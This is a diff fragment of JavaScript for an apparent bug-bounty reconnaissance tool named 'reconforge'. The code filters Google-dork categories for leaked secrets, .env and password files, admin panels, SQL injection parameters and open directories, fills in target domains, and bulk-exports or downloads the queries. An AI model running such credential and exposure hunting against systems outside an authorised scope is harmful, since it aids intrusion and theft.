+    var activeCat = activeChip ? activeChip.getAttribute('data-cat') : 'all';
+    var domains = getAllLoadedDomains();
+    var data = loadMegaData();
+    var lines = [];
+
+    for(var cat in data){
+      if(!Object.prototype.hasOwnProperty.call(data, cat)) continue;
+      if(activeCat !== 'all'){
+        var catLower = cat.toLowerCase();
+        var match = false;
+        if(activeCat === 'bbp' && catLower.indexOf('platform programs') !== -1) match = true;
+        else if(activeCat === 'vdp' && (catLower.indexOf('responsible disclosure') !== -1 || catLower.indexOf('security.txt') !== -1)) match = true;
+        else if(activeCat === 'elite' && catLower.indexOf('top 1%') !== -1) match = true;
+        else if(activeCat === 'github' && catLower.indexOf('github') !== -1) match = true;
+        else if(activeCat === 'shodan' && catLower.indexOf('shodan') !== -1) match = true;
+        else if(activeCat === 'cloud' && catLower.indexOf('cloud') !== -1) match = true;
+        else if(activeCat === 'secrets' && (catLower.indexOf('.env') !== -1 || catLower.indexOf('password') !== -1)) match = true;
+        else if(activeCat === 'admin' && (catLower.indexOf('admin') !== -1 || catLower.indexOf('login') !== -1)) match = true;
+        else if(activeCat === 'sqli' && catLower.indexOf('sqli') !== -1) match = true;
+        else if(activeCat === 'backups' && (catLower.indexOf('open directory') !== -1 || catLower.indexOf('backup') !== -1)) match = true;
+        else if(activeCat === 'api' && catLower.indexOf('api') !== -1) match = true;
+        else if(activeCat === 'actuators' && catLower.indexOf('actuator') !== -1) match = true;
+        if(!match) continue;
+      }
+      var dorks = data[cat] || [];
+      domains.forEach(function(d){
+        dorks.forEach(function(raw){
+          lines.push(raw.replace(/target\.com/g, d));
+        });
+      });
+    }
+
+    if(!lines.length){
+      alert('No dorks to export for category: ' + activeCat);
+      return;
+    }
+
+    var blob = new Blob([lines.join('\n')], {type: 'text/plain'});
+    var a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'reconforge_' + activeCat + '_all_' + domains.length + '_targets.txt';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    alert('✓ Exported ' + lines.length + ' dorks customized for ' + domains.length + ' target(s)!');
+  };
+
   function setupGlobalDorkEngine(){
     var input = document.getElementById('globalDorkInput');
     var clearBtn = document.getElementById('globalDorkClearBtn');
@@ -7603,12 +8004,97 @@ echo -e "\${C_CYAN}=============================================================
     var resultsBox = document.getElementById('globalDorkResults');
     var miniDomain = document.getElementById('miniDomainInput');
     var jumpBtn = document.getElementById('tbDorkSearchJump');
+    var sel = document.getElementById('dorkTargetSelect');
+    var prevBtn = document.getElementById('dorkPrevTargetBtn');
+    var nextBtn = document.getElementById('dorkNextTargetBtn');
+    var singleBtn = document.getElementById('dorkSingleModeBtn');
+    var combBtn = document.getElementById('dorkCombinedModeBtn');
+    var bulkBtn = document.getElementById('dorkBulkExportBtn');
+    var copyAllBtn = document.getElementById('dorkCopyAllBtn');
+    var dlCatBtn = document.getElementById('dorkDownloadCategoryBtn');
 
     if(jumpBtn){
-      jumpBtn.addEventListener('click', function(){
-        if(input) input.focus();
-        var s = document.getElementById('globalDorkSection');
-        if(s) s.scrollIntoView({behavior:'smooth'});
+      jumpBtn.addEventListener('click', window.jumpToPhase21Dorks);
+    }
+
+    if(sel){
+      sel.addEventListener('change', function(){
+        window.activeTargetIndex = parseInt(this.value, 10) || 0;
+        window.multiTargetCombinedMode = false;
+        window.runGlobalDorkSearch();
+      });
+    }
+
+    if(prevBtn){
+      prevBtn.addEventListener('click', function(){
+        var domains = getAllLoadedDomains();
+        window.activeTargetIndex = (window.activeTargetIndex - 1 + domains.length) % domains.length;
+        window.multiTargetCombinedMode = false;
+        window.runGlobalDorkSearch();
+      });
+    }
+
+    if(nextBtn){
+      nextBtn.addEventListener('click', function(){
+        var domains = getAllLoadedDomains();
+        window.activeTargetIndex = (window.activeTargetIndex + 1) % domains.length;
+        window.multiTargetCombinedMode = false;
+        window.runGlobalDorkSearch();
+      });
+    }
+
+    if(singleBtn){
+      singleBtn.addEventListener('click', function(){
+        window.multiTargetCombinedMode = false;
+        window.runGlobalDorkSearch();
+      });
+    }
+
+    if(combBtn){
+      combBtn.addEventListener('click', function(){
+        window.multiTargetCombinedMode = true;
+        window.runGlobalDorkSearch();
+      });
+    }
+
+    if(bulkBtn){
+      bulkBtn.addEventListener('click', window.exportCategoryDorksForAllTargets);
+    }
+
+    if(copyAllBtn){
+      copyAllBtn.addEventListener('click', function(){
+        var items = document.querySelectorAll('.gsearch-item .gsearch-query');
+        if(!items.length) return;
+        var text = Array.from(items).map(function(el){ return el.textContent; }).join('\n');
+        navigator.clipboard.writeText(text).then(function(){
+          var old = copyAllBtn.textContent;
+          copyAllBtn.textContent = '✓ Copied ' + items.length + '!';
+          setTimeout(function(){ copyAllBtn.textContent = old; }, 1500);
+        });
+      });
+    }
+
+    if(dlCatBtn){
+      dlCatBtn.addEventListener('click', function(){
+        var activeChip = document.querySelector('.gsearch-tag.active');
+        var cat = activeChip ? activeChip.getAttribute('data-cat') : 'all';
+        var catFileMap = {
+          all: '01_top_1_percent_elite_vault.txt',
+          bbp: '02_bbp_paid_bug_bounty_programs.txt',
+          vdp: '03_vdp_responsible_disclosure_and_security_txt.txt',
+          elite: '01_top_1_percent_elite_vault.txt',
+          github: '04_github_secrets_and_api_tokens.txt',
+          shodan: '10_shodan_dorks_and_recon.txt',
+          cloud: '14_shopping_and_financial_data.txt',
+          secrets: '06_passwords_credentials_and_env_files.txt',
+          admin: '05_admin_portals_and_login_panels.txt',
+          api: '11_apis_and_target_discovery.txt',
+          sqli: '07_sqli_and_injection_parameters.txt',
+          actuators: '13_vulnerable_software_and_version_banners.txt',
+          backups: '09_open_directory_listings.txt'
+        };
+        var file = catFileMap[cat] || '01_top_1_percent_elite_vault.txt';
+        window.downloadDorkWordlist(file);
       });
     }
 
@@ -7666,9 +8152,7 @@ echo -e "\${C_CYAN}=============================================================
     var scopeTextarea = document.getElementById('domainInput');
     if(scopeTextarea){
       scopeTextarea.addEventListener('input', function(){
-        var d = getActiveDomain();
-        var targetLabel = document.getElementById('gsearchTargetLabel');
-        if(targetLabel) targetLabel.textContent = d;
+        window.activeTargetIndex = 0;
         window.runGlobalDorkSearch();
       });
     }
@@ -7676,11 +8160,7 @@ echo -e "\${C_CYAN}=============================================================
     document.addEventListener('keydown', function(e){
       if((e.ctrlKey && e.key.toLowerCase() === 'k') || (e.key === '/' && document.activeElement.tagName !== 'INPUT' && document.activeElement.tagName !== 'TEXTAREA')){
         e.preventDefault();
-        if(input){
-          input.focus();
-          var s = document.getElementById('globalDorkSection');
-          if(s) s.scrollIntoView({behavior:'smooth'});
-        }
+        window.jumpToPhase21Dorks();
       }
     });
 
@@ -7693,6 +8173,41 @@ echo -e "\${C_CYAN}=============================================================
     setupGlobalDorkEngine();
   }
 })();
+</script>
+
+<script>
+window.jumpToPhase21Dorks = function(){
+  var p21 = document.getElementById('p21');
+  if(p21){
+    p21.scrollIntoView({behavior:'smooth'});
+    var step = p21.querySelector('.step');
+    if(step && !step.classList.contains('open')){
+      step.classList.add('open');
+    }
+    setTimeout(function(){
+      var inp = document.getElementById('globalDorkInput');
+      if(inp) inp.focus();
+    }, 450);
+  }
+};
+
+window.jumpToConsoleCategory = function(catKey){
+  window.jumpToPhase21Dorks();
+  var chip = document.querySelector('.gsearch-tag[data-cat="' + catKey + '"]');
+  if(chip){
+    chip.click();
+  }
+};
+
+window.downloadDorkWordlist = function(filename){
+  var link = document.createElement('a');
+  link.href = 'wordlists/dorks/' + filename;
+  link.download = filename;
+  link.target = '_blank';
+  document.body.appendChild(link);
+  link.click();
+  document.body.removeChild(link);
+};
 </script>
 
 </body>
